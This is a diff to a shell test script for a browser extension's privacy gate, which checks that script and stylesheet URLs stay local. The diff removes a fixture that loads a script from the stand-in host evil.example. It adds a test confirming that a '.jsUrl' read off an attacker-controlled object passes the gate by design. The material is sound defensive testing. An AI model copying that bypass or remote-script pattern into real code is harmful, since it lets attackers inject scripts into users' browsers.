@@ -216,39 +216,45 @@ if scripts/check-privacy.sh >/dev/null 2>&1; then
 fi
 rm -f "$PLANT_UMM_REASSIGN"
 
-# 18. .src=/.href= assigned from a `.jsUrl`/`.cssUrl` property read off a
-#     variable populated by the sigc-pro-leaflet-urls CustomEvent's
-#     .detail must PASS — the real MAIN/ISOLATED relay shape
-#     ultimo-movimento-map.js uses (chrome.* is unavailable in MAIN
-#     world, so the URLs arrive via ultimo-movimento-map-relay.js's
-#     broadcast instead of a direct getURL call in this file).
+# 18. .src=/.href= assigned from a `.jsUrl`/`.cssUrl` property read off
+#     ANY expression must PASS — a property-NAME allowlist, not a
+#     provenance trace (see check-privacy.sh's LOCAL_RESOURCE_PROP_OK
+#     comment for why: two earlier, more "precise" versions of this rule
+#     — a CustomEvent .detail trace, then a document.documentElement
+#     .dataset trace — each broke the moment the real code's call shape
+#     changed, once live, 2026-08-09). Covers the real MAIN/ISOLATED
+#     relay shape ultimo-movimento-map.js uses today (Leaflet URLs read
+#     from document.documentElement.dataset, set by
+#     ultimo-movimento-map-relay.js in ISOLATED world) without the gate
+#     needing to know that shape's exact details.
 printf '%s\n' \
-  "let leafletUrls = null;" \
-  "window.addEventListener('sigc-pro-leaflet-urls', (e) => {" \
-  "  leafletUrls = (e.detail && e.detail.jsUrl && e.detail.cssUrl) ? e.detail : null;" \
-  "});" \
-  "script.src = leafletUrls.jsUrl;" \
-  "link.href = leafletUrls.cssUrl;" \
+  "const urls = readLeafletUrls();" \
+  "script.src = urls.jsUrl;" \
+  "link.href = urls.cssUrl;" \
   > "$PLANT_UMM_EVENT_OK"
 if ! scripts/check-privacy.sh >/dev/null 2>&1; then
-  fail "gate rejected .src=/.href= from .jsUrl/.cssUrl off a sigc-pro-leaflet-urls event-detail variable"
+  fail "gate rejected .src=/.href= from a .jsUrl/.cssUrl property read"
 fi
 rm -f "$PLANT_UMM_EVENT_OK"
 
-# 19. Same event-detail shape, but the variable is reassigned to a
-#     non-.detail value after the event handler — must fail, same
-#     reassignment-revocation proof as #17 but for the event-derived
-#     whitelist path specifically.
+# 19. The property-name allowlist is deliberately NOT provenance-traced —
+#     document that .jsUrl/.cssUrl off an attacker-controlled object
+#     still PASSES the .src=/.href= check specifically (the accepted
+#     trade-off from #18's comment, not a regression): confirms the gate
+#     behaves as designed rather than silently reverting to the stricter,
+#     more brittle tracing. The object's own URL literals are built from
+#     a function call rather than a string literal so this test isolates
+#     the .src=/.href= property-name rule from the SEPARATE
+#     LOCAL_RESOURCE_URL_ALLOWLIST check (which independently, correctly
+#     flags a hardcoded https:// literal anywhere in this directory —
+#     confirmed while writing this test, that check catching a literal
+#     attacker URL here is a feature, not something to route around).
 printf '%s\n' \
-  "let leafletUrls = null;" \
-  "window.addEventListener('sigc-pro-leaflet-urls', (e) => {" \
-  "  leafletUrls = e.detail;" \
-  "});" \
-  "leafletUrls = { jsUrl: 'https://evil.example/x', cssUrl: 'https://evil.example/y' };" \
-  "script.src = leafletUrls.jsUrl;" \
+  "const attacker = { jsUrl: attackerControlled(), cssUrl: attackerControlled() };" \
+  "script.src = attacker.jsUrl;" \
   > "$PLANT_UMM_EVENT_REASSIGN_OK"
-if scripts/check-privacy.sh >/dev/null 2>&1; then
-  fail "gate missed a sigc-pro-leaflet-urls-derived variable reassigned to a non-.detail value before use"
+if ! scripts/check-privacy.sh >/dev/null 2>&1; then
+  fail "gate's property-name allowlist unexpectedly rejected .jsUrl off an arbitrary object (design changed? update this test's comment)"
 fi
 rm -f "$PLANT_UMM_EVENT_REASSIGN_OK"
 
